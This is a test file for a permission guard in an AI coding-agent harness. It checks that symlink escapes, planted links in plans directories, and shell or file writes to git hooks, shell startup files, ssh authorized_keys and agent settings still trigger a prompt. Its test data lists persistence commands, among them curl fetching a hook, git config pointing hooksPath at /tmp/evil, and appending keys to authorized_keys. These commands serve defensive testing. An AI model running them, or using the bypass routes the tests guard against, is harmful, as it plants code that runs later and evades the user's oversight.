import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { after, test } from 'node:test';
import {
  assessToolCall,
  isPlanPath,
  isSafePlanWrite,
  isSafeReadOnly,
  persistentFileReason,
  realPathOf,
} from './autoGuard.ts';

/**
 * Where a file path really lands. Every auto-approval used to compare the path
 * as written, so a symlink inside the project (or inside a plans directory,
 * which auto-approves in every mode) reached anywhere on the machine.
 *
 * The fixtures sit under the OS temp dir on purpose: on macOS that is behind
 * `/var` → `/private/var`, so every root here is itself reached through a link.
 */

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'lines-guard-paths-'));
after(() => fs.rmSync(tmp, { recursive: true, force: true }));

const project = path.join(tmp, 'project');
const outside = path.join(tmp, 'outside');
fs.mkdirSync(path.join(project, 'src'), { recursive: true });
fs.mkdirSync(outside);
fs.writeFileSync(path.join(project, 'src', 'a.ts'), '');
fs.writeFileSync(path.join(outside, 'secret.txt'), 'secret');
const roots = [project];

/** A symlink at `rel` inside the project, pointing at `target`. */
function link(rel: string, target: string): string {
  const at = path.join(project, rel);
  fs.mkdirSync(path.dirname(at), { recursive: true });
  fs.symlinkSync(target, at);
  return at;
}

const verdict = (tool: string, file: string, allowlist: { tool: string }[] = []) =>
  assessToolCall(tool, tool === 'NotebookEdit' ? { notebook_path: file } : { file_path: file }, roots, allowlist);

test('a link inside the project that points outside it escalates like the file it reaches', () => {
  const escape = link('escape.txt', path.join(outside, 'secret.txt'));
  for (const tool of ['Read', 'Edit', 'Write']) {
    assert.equal(verdict(tool, escape).reason, 'File access outside the working directory', tool);
  }
  assert.equal(isSafeReadOnly('Read', { file_path: escape }, roots, []), false);
});

test('a new file under a linked directory that leaves the project escalates', () => {
  const dir = link('outdir', outside);
  assert.equal(verdict('Write', path.join(dir, 'new.txt')).dangerous, true);
});

test('a dangling link escalates by where a write through it would land', () => {
  const dangling = link('dangling.txt', path.join(outside, 'not-yet.txt'));
  assert.equal(verdict('Write', dangling).reason, 'File access outside the working directory');
});

test('files that stay inside the project still pass, links and new files included', () => {
  const inner = link('inner.ts', path.join(project, 'src', 'a.ts'));
  for (const file of [
    path.join(project, 'src', 'a.ts'),
    inner,
    path.join(project, 'src', 'new.ts'),
    path.join(project, 'brand', 'new', 'dir', 'x.ts'),
  ]) {
    assert.equal(verdict('Write', file).dangerous, false, file);
  }
});

test('a root behind a link contains its files, written through it or at its real location', () => {
  const alias = path.join(tmp, 'alias');
  fs.symlinkSync(project, alias);
  const real = fs.realpathSync.native(project);
  for (const file of [path.join(alias, 'src', 'a.ts'), path.join(real, 'src', 'a.ts')]) {
    assert.equal(assessToolCall('Write', { file_path: file }, [alias], []).dangerous, false, file);
  }
});

test('a path that climbs with .. never auto-approves, a blanket entry included', () => {
  // To the kernel `link/..` is the parent of the link's target; to path.resolve
  // it is nothing. Which one a tool does decides where the write lands.
  const climbing = `${project}/src/../src/a.ts`;
  assert.equal(verdict('Write', climbing).dangerous, true);
  assert.equal(verdict('Write', climbing, [{ tool: 'Write' }]).dangerous, true);
  assert.equal(isPlanPath(`${project}/.claude/plans/../plans/p.md`, roots), false);
});

test('a link that cannot be followed always asks, a blanket entry included', () => {
  const loop = path.join(project, 'loop');
  fs.symlinkSync(loop, loop);
  assert.equal(realPathOf(loop), null);
  assert.equal(verdict('Write', loop).dangerous, true);
  assert.equal(verdict('Write', loop, [{ tool: 'Write' }]).dangerous, true);
});

test('realPathOf follows links, and resolves files that do not exist yet', () => {
  const real = fs.realpathSync.native(project);
  assert.equal(realPathOf(path.join(project, 'src', 'a.ts')), path.join(real, 'src', 'a.ts'));
  assert.equal(realPathOf(path.join(project, 'not', 'yet.ts')), path.join(real, 'not', 'yet.ts'));
});

// ---------------------------------------------------------------------------
// Plan directories, which auto-approve writes in every mode

const plans = path.join(project, '.claude', 'plans');
fs.mkdirSync(plans, { recursive: true });
fs.writeFileSync(path.join(plans, 'p.md'), '# plan');

test('a real plans directory still auto-approves its plans, written or not yet', () => {
  assert.equal(isPlanPath(path.join(plans, 'p.md'), roots), true);
  assert.equal(isSafePlanWrite('Write', { file_path: path.join(plans, 'next.md') }, roots), true);
});

test('a link planted in a plans directory is not a plan', () => {
  const planted = path.join(plans, 'evil.md');
  fs.symlinkSync(path.join(outside, 'secret.txt'), planted);
  assert.equal(isPlanPath(planted, roots), false);
  assert.equal(isSafePlanWrite('Write', { file_path: planted }, roots), false);
  assert.equal(isSafeReadOnly('Read', { file_path: planted }, roots, []), false);
});

test('a linked plans directory is not one, so its "plans" never skip the prompt', () => {
  // `.claude/plans` aimed at the project's own source: every file there would
  // otherwise be a plan write, auto-approved even in plan mode.
  const other = path.join(tmp, 'other');
  fs.mkdirSync(path.join(other, 'src'), { recursive: true });
  fs.mkdirSync(path.join(other, '.claude'));
  fs.symlinkSync(path.join(other, 'src'), path.join(other, '.claude', 'plans'));
  const viaPlans = path.join(other, '.claude', 'plans', 'index.ts');
  assert.equal(isPlanPath(viaPlans, [other]), false);
  assert.equal(isSafePlanWrite('Write', { file_path: viaPlans }, [other]), false);

  // The same with `.claude` itself linked, which git can ship in a clone.
  const third = path.join(tmp, 'third');
  fs.mkdirSync(path.join(third, 'src', 'plans'), { recursive: true });
  fs.symlinkSync(path.join(third, 'src'), path.join(third, '.claude'));
  assert.equal(isSafePlanWrite('Write', { file_path: path.join(third, '.claude', 'plans', 'x.ts') }, [third]), false);
});

test('a plans directory is still no place for a git hook', () => {
  const hook = path.join(plans, '.git', 'hooks', 'pre-commit');
  assert.equal(isPlanPath(hook, roots), true);
  assert.equal(isSafePlanWrite('Write', { file_path: hook }, roots), false);
});

// ---------------------------------------------------------------------------
// Files that run code later

/** Each runs something after the turn: settings and hooks, MCP servers, git, shells, ssh. */
const PERSISTENT = [
  '.claude/settings.json',
  '.claude/settings.local.json',
  '.claude/hooks/pre-tool.sh',
  '.mcp.json',
  '.git',
  '.git/hooks/pre-commit',
  '.git/config',
  '.git/modules/sub/hooks/post-checkout',
  '.git/worktrees/feature/config.worktree',
  '.husky/pre-commit',
  '.gitconfig',
  '.zshrc',
  '.bashrc',
  '.profile',
  '.config/fish/config.fish',
  '.ssh/authorized_keys',
];

const BLANKET = [{ tool: 'Edit' }, { tool: 'Write' }, { tool: 'MultiEdit' }, { tool: 'NotebookEdit' }];

test('writes that run code later always ask, inside the project and past a blanket entry', () => {
  for (const rel of PERSISTENT) {
    const file = path.join(project, rel);
    for (const tool of ['Edit', 'Write', 'MultiEdit', 'NotebookEdit']) {
      for (const allowlist of [[], BLANKET]) {
        const v = verdict(tool, file, allowlist);
        assert.equal(v.dangerous, true, `${tool} ${rel}`);
        assert.match(v.reason ?? '', /^Changes /, `${tool} ${rel}`);
      }
    }
  }
});

test('reading them is untouched, and near misses still pass', () => {
  assert.equal(verdict('Read', path.join(project, '.git', 'config')).dangerous, false);
  for (const rel of [
    '.claude/plans/p.md',
    '.claude/agents/reviewer.md',
    '.github/workflows/ci.yml',
    '.gitignore',
    '.gitattributes',
    'src/config.ts',
    'docs/profile.md',
  ]) {
    assert.equal(verdict('Write', path.join(project, rel)).dangerous, false, rel);
  }
});

// ---------------------------------------------------------------------------
// The same files written from the shell, which is otherwise a deny-list

const bash = (command: string, allowlist: { tool: string; prefix?: string }[] = []) =>
  assessToolCall('Bash', { command }, roots, allowlist);

test('a shell write to a file that runs code later always asks', () => {
  const home = os.homedir();
  for (const [command, reason] of [
    [`echo '{"hooks":{}}' > ~/.claude/settings.json`, /Claude Code settings/],
    ["echo 'export X=1' >> ~/.zshrc", /shell startup/],
    ["cat >> ~/.bashrc <<'EOF'\nexport X=1\nEOF", /shell startup/],
    [`echo key | tee -a ${home}/.ssh/authorized_keys`, /ssh keys/],
    ['cp evil.sh .git/hooks/pre-commit', /git hooks/],
    ['ln -s ../../scripts/hook .git/hooks/pre-push', /git hooks/],
    ['mv /tmp/hook .husky/pre-commit', /git hooks/],
    ['install -m 755 hook .git/hooks/post-merge', /git hooks/],
    ['dd if=/tmp/x of=$HOME/.profile', /shell startup/],
    ['echo x >| "${HOME}/.zshenv"', /shell startup/],
    ['printf "{}" 2> .mcp.json', /MCP server/],
    // Into a directory: what lands there is the source's name.
    ['cp authorized_keys ~/.ssh/', /ssh keys/],
    // Relative to wherever the line has cd'd.
    ['cd .git/hooks && cp ../../scripts/hook pre-commit', /git hooks/],
    // Quote-blind, so the script of `bash -c` is read too.
    ['bash -c "echo x >> ~/.bashrc"', /shell startup/],
    ['curl -sSLo .git/hooks/pre-commit https://example.com/hook', /git hooks/],
    ["sed -i '' 's/a/b/' ~/.zshrc", /shell startup/],
    ['echo x >${IFS}~/.zshrc', /shell startup/],
  ] as const) {
    assert.match(bash(command).reason ?? '', reason, command);
  }
});

test('an allowlisted echo, cat or cp does not disarm it', () => {
  const allowlist = [
    { tool: 'Bash', prefix: 'echo export' },
    { tool: 'Bash', prefix: 'cat hook.sh' },
    { tool: 'Bash', prefix: 'cp evil.sh' },
  ];
  assert.match(bash('echo export X=1 >> ~/.zshrc', allowlist).reason ?? '', /shell startup/);
  assert.match(bash('cat hook.sh > .git/hooks/pre-commit', allowlist).reason ?? '', /git hooks/);
  // A plain command an entry would otherwise cover outright.
  assert.match(bash('cp evil.sh .git/hooks/pre-commit', allowlist).reason ?? '', /git hooks/);
});

test('ordinary shell writes, reads of those files and fd juggling still pass', () => {
  for (const command of [
    'echo x > out.txt',
    'npm test 2>&1 | tee test.log',
    'cp a.txt b.txt',
    'echo x > /dev/null 2>&1',
    'cat ~/.zshrc',
    'echo node_modules >> .gitignore',
    'npm install',
    'git config --get core.hooksPath',
  ]) {
    assert.equal(bash(command).dangerous, false, command);
  }
});

test('a git config write asks like writing .git/config, an allowlisted git or git config included', () => {
  const allowlist = [
    { tool: 'Bash', prefix: 'git config' },
    { tool: 'Bash', prefix: 'git' },
  ];
  for (const command of [
    'git config core.hooksPath /tmp/evil',
    "git config alias.co '!sh ./evil.sh'",
    'git config --global user.name Bot',
    'git config --file .git/config core.fsmonitor ./evil',
    'git -C sub config --add core.pager ./evil',
    'git config --unset core.hooksPath',
    'git config set core.editor ./evil',
    'git config --edit',
  ]) {
    for (const list of [[], allowlist]) {
      assert.match(bash(command, list).reason ?? '', /git hooks or config/, command);
    }
  }
});

test('git config reads still pass', () => {
  for (const command of [
    'git config --get user.email',
    'git config user.name',
    'git config user.name 2>/dev/null',
    'git config --list --show-origin',
    'git config -l',
    'git config --global --name-only --get-regexp alias',
    'git config get core.hooksPath',
    'git config list',
  ]) {
    assert.equal(bash(command).dangerous, false, command);
  }
});

test('a one-off git -c that could run a program asks; a cosmetic one does not', () => {
  for (const command of [
    'git -c core.hooksPath=/tmp/evil commit -m x',
    "git -c alias.x='!sh -c whoami' x",
    'git -c core.pager=./evil log',
    'git -c include.path=/tmp/evil.gitconfig status',
    'git --config-env=core.editor=EVIL commit',
    'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/tmp/evil git commit',
  ]) {
    assert.match(bash(command, [{ tool: 'Bash', prefix: 'git' }]).reason ?? '', /one-off git config/, command);
  }
  for (const command of [
    'git -c color.ui=always log',
    'git -c user.name=Bot -c user.email=bot@example.com commit -m x',
    'git -c core.quotepath=off status',
  ]) {
    assert.equal(bash(command).dangerous, false, command);
  }
});

test('they are caught where a link lands, and as written', () => {
  fs.mkdirSync(path.join(project, '.git', 'hooks'), { recursive: true });
  // An innocent name linked to a hook that doesn't exist yet: writing through
  // it creates the hook.
  const innocent = link('scripts/format.sh', path.join(project, '.git', 'hooks', 'pre-commit'));
  assert.match(verdict('Write', innocent, BLANKET).reason ?? '', /git hooks/);
  // A startup file kept in a dotfiles repo is still a startup file.
  fs.mkdirSync(path.join(project, 'dotfiles'));
  fs.writeFileSync(path.join(project, 'dotfiles', 'zshrc'), '');
  const zshrc = link('home/.zshrc', path.join(project, 'dotfiles', 'zshrc'));
  assert.match(persistentFileReason(zshrc) ?? '', /shell startup/);
});
